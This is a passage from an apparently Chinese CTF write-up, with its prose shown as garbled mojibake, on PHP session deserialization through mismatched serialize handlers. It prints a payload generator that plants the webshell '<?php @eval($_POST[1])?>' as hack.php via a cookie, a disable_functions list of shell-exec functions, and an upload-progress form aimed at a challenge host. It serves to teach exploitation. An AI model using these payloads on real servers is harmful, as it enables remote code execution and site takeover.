<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!php</span><br><span class="hljs-comment">// var_dump($_SESSION);</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:4:&quot;</span>ryat<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>

<p>åˆ™ååºåˆ—åŒ–åè¿˜åŸå¾—åˆ°ä¸€ä¸ªæ–°çš„å¯¹è±¡ é€šè¿‡æ³¨å…¥ <code>|</code> å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®</p>
<h4 id="æ¼æ´æµ‹è¯•"><a href="#æ¼æ´æµ‹è¯•" class="headerlink" title="æ¼æ´æµ‹è¯•"></a>æ¼æ´æµ‹è¯•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s2.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…ˆè®¿é—®ä¸€ä¸‹ s2 åº”ä¸ºç©º</p>
<p>æ¥ç€è®¿é—®<code>s1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code></p>
<p>ç„¶åè®¿é—®ä¸€ä¸‹ s2 å›æ˜¾ spoockï¼Œä¼ å…¥çš„æ•°æ®ä¼šæŒ‰ç…§<strong>php_serialize</strong>æ¥è¿›è¡Œåºåˆ—åŒ–ã€‚ æ­¤æ—¶è®¿é—® us2.php æ—¶ï¼Œé¡µé¢è¾“å‡ºï¼Œ<code>spoock</code>æˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„å‡½æ•°ã€‚å› ä¸ºåœ¨è®¿é—® us2.php æ—¶ï¼Œç¨‹åºä¼šæŒ‰ç…§<strong>php</strong>æ¥ååºåˆ—åŒ– SESSION ä¸­çš„æ•°æ®ï¼Œå®ä¾‹åŒ– lemon å¯¹è±¡ï¼Œsession ååºåˆ—åŒ–ä¼šæ‰§è¡Œé‡Œé¢é”€æ¯å‰çš„é­”æœ¯å‡½æ•°<code>__destruct()</code>ï¼Œå‰é¢çš„<code>__construct()</code>å°±ä¸å†æ‰§è¡Œäº†ã€‚</p>
<h3 id="é¢˜"><a href="#é¢˜" class="headerlink" title="é¢˜"></a>é¢˜</h3><h4 id="ctfshow-1"><a href="#ctfshow-1" class="headerlink" title="ctfshow"></a>ctfshow</h4><ul>
<li>ctfshow263</li>
</ul>
<p>ä¸‹è½½æºç ï¼Œä»£ç å®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>	error_reporting(<span class="hljs-number">0</span>);<br>	session_start();<br>	<span class="hljs-comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br>		<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br>		<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		 setcookie(<span class="hljs-string">&quot;limit&quot;</span>,base64_encode(<span class="hljs-string">&#x27;1&#x27;</span>));<br>		 <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>	&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ³¨æ„æ­¤å¤„æœ‰</p>
<blockquote>
<p>session_start();</p>
<p>è¿™ä¸ªå®¡è®¡ä¸‹æ¥äº”æ¬¡ç™»å½•é”™è¯¯å°±ç¦æ­¢äº†ï¼Œä½†ä»”ç»†ä¸€çœ‹<code>$_SESSION[&#39;limti&#39;]&gt;5</code>æ‹¼å†™æœ‰è¯¯ï¼Œå°±æ˜¯å“äººçš„ï¼Œä¸‹é¢ä¸¤è¡Œä»£ç å¿…å®šæ‰§è¡Œ</p>
<p>$_SESSION[â€˜limitâ€™]=base64_decode($_COOKIE[â€˜limitâ€™]);</p>
<p>$_COOKIE[â€˜limitâ€™] = base64_encode(base64_decode($_COOKIE[â€˜limitâ€™]) +1);</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//check.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET</span>)&#123;<br>	<span class="hljs-variable">$data</span>= <span class="hljs-variable">$db</span>-&gt;get(<span class="hljs-string">&#x27;admin&#x27;</span>,<br>	[	<span class="hljs-string">&#x27;id&#x27;</span>,<br>		<span class="hljs-string">&#x27;UserName0&#x27;</span><br>	],[<br>		<span class="hljs-string">&quot;AND&quot;</span>=&gt;[<br>		<span class="hljs-string">&quot;UserName0[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<br>		<span class="hljs-string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] <span class="hljs-comment">//å¯†ç å¿…é¡»ä¸º128ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br>		]<br>	]);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br>		<span class="hljs-comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span><br>		<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">0</span>;<br>		<span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;UserName0&#x27;</span>]));<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span><br>		<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])+<span class="hljs-number">1</span>);<br>		<span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;ç™»é™†å¤±è´¥&quot;</span>));<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œä¸å¯èƒ½ä¼šç™»å½•æˆåŠŸï¼Œä¸‹é¢ä»£ç ä¹Ÿå¿…å®šæ‰§è¡Œ</p>
<p>$_COOKIE[â€˜limitâ€™] = base64_encode(base64_decode($_COOKIE[â€˜limitâ€™])+1);<br>echo json_encode(array(â€œerrorâ€,â€msgâ€=&gt;â€ç™»é™†å¤±è´¥â€));</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//inc.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>session_start();<br><span class="hljs-keyword">use</span> \<span class="hljs-title">CTFSHOW</span>\<span class="hljs-title">CTFSHOW</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;CTFSHOW.php&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> CTFSHOW([<br>    <span class="hljs-string">&#x27;database_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-string">&#x27;database_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;web&#x27;</span>,<br>    <span class="hljs-string">&#x27;server&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-number">3306</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;option&#x27;</span> =&gt; [<br>        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL<br>    ]<br>]);<br><span class="hljs-comment">// sqlæ³¨å…¥æ£€æŸ¥</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkForm</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        file_put_contents(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-string">&quot;ä½¿ç”¨&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;password.<span class="hljs-string">&quot;ç™»é™†&quot;</span>.(<span class="hljs-keyword">$this</span>-&gt;status?<span class="hljs-string">&quot;æˆåŠŸ&quot;</span>:<span class="hljs-string">&quot;å¤±è´¥&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*ç”Ÿæˆå”¯ä¸€æ ‡å¿—</span><br><span class="hljs-comment">*æ ‡å‡†çš„UUIDæ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$chars</span> = md5(uniqid(mt_rand(), <span class="hljs-literal">true</span>));<br>    <span class="hljs-variable">$uuid</span> = substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„æ­¤å¤„</p>
<blockquote>
<p>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);</p>
</blockquote>
<p>å‡ºç°äº†ä¸€ä¸ªå†™æ–‡ä»¶çš„å‡½æ•°ï¼Œå›é¡¾ index.php å‘ç°<code>$this-&gt;usernameå’Œ$this-&gt;password</code>æ˜¯å¯æ§çš„ï¼Œè€Œåˆè¢«åŒ…å«åœ¨ check.php</p>
<blockquote>
<p>file_put_contents(â€œlog-â€œ.$this-&gt;username, â€œä½¿ç”¨â€.$this-&gt;password.â€ç™»é™†â€.($this-&gt;status?â€æˆåŠŸâ€:â€å¤±è´¥â€).â€â€”-â€œ.date_create()-&gt;format(â€˜Y-m-d H:i:sâ€™));</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡ cookie ä¼ è¿›å»æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œçœ‹ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021221915549.png" srcset="/img/loading.gif" lazyload></p>
<p><code>MQ%3D%3D</code>â€“&gt;<code>MQ==</code>â€“&gt;<code>a</code>ï¼Œå¾ˆæ˜æ˜¾çš„ä¼ å€¼äº†ï¼Œé¦–å…ˆåœ¨ cookie ä¸­è®¾ç½® limit å€¼ä¸º payloadï¼Œç„¶ååˆ·æ–° index.phpï¼Œæ­¤æ—¶ session_start()å¼€å¯äº†ä¼šè¯ï¼Œç›²çŒœæ˜¯ php_serialize å¼•æ“å­˜å‚¨çš„å¯¹è±¡æ•°æ®ï¼Œæˆ‘ä»¬å†é€šè¿‡è®¿é—®åŒ…å«äº† inc.php çš„ check.phpï¼Œå°±æ‰§è¡Œäº†è®¾ç½® php ä¸ºå¼•æ“çš„ä»£ç ï¼Œè¿›è€Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªæ–°çš„å¯¹è±¡</p>
<p>æ‰€ä»¥é€šè¿‡æ³¨å…¥ <code>|</code> å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œç”Ÿæˆæœ¨é©¬æ–‡ä»¶</p>
<p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;hack.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span> = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> User();<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-string">&#x27;|&#x27;</span>.serialize(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p>
<p>cookie ä¸­å«æœ‰ UM_distinctid çš„ï¼Œä¸å¯ç”¨ hackbar çš„å¢åŠ å¤´åŠŸèƒ½ï¼Œä¼šè¦†ç›–æ‰åŸæœ‰çš„ cookieï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡åªæ˜¯æ›¿æ¢ cookie[PHPSESSID]å€¼</p>
<h4 id="jarvisoj-web-çš„ä¸€é“-SESSION-ååºåˆ—åŒ–"><a href="#jarvisoj-web-çš„ä¸€é“-SESSION-ååºåˆ—åŒ–" class="headerlink" title="jarvisoj-web çš„ä¸€é“ SESSION ååºåˆ—åŒ–"></a>jarvisoj-web çš„ä¸€é“ SESSION ååºåˆ—åŒ–</h4><p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å­˜åœ¨<code>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™)</code>ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°ç”¨ php_serialize æ·»åŠ  session çš„æ–¹æ³•ï¼Œä½† get ä¼ å…¥ phpinfo æ—¶ä¼šå®ä¾‹åŒ–<code>OowoO</code>è¿™ä¸ªç±»å¹¶å¯ä»¥æŸ¥çœ‹ phpinfo</p>
<blockquote>
<p>index.php?phpinfo</p>
</blockquote>
<p>disable_function</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,<span class="hljs-keyword">chmod</span>,set_time_limit,<span class="hljs-keyword">chroot</span>,error_log,pfsockopen,syslog,<span class="hljs-keyword">symlink</span>,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/12/.png" srcset="/img/loading.gif" lazyload></p>
<p><code>session.upload_progress.enabled</code>ä¸º Onã€‚<code>session.upload_progress.enabled</code>æœ¬èº«ä½œç”¨ä¸å¤§ï¼Œæ˜¯ç”¨æ¥æ£€æµ‹ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¿›åº¦ã€‚ä½†å½“ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ï¼ŒåŒæ—¶ POST ä¸€ä¸ªä¸ php.ini ä¸­<code>session.upload_progress.name</code>åŒåçš„å˜é‡æ—¶ï¼ˆ<code>session.upload_progress.name</code>çš„å˜é‡å€¼é»˜è®¤ä¸º<code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼‰ï¼ŒPHP æ£€æµ‹åˆ°è¿™ç§åŒåè¯·æ±‚ä¼šåœ¨$_SESSION ä¸­æ·»åŠ ä¸€æ¡æ•°æ®ã€‚æˆ‘ä»¬ç”±æ­¤æ¥è®¾ç½® sessionã€‚</p>
<p>é¦–å…ˆ å…ˆæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span></span><br><span class="hljs-tag">  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> 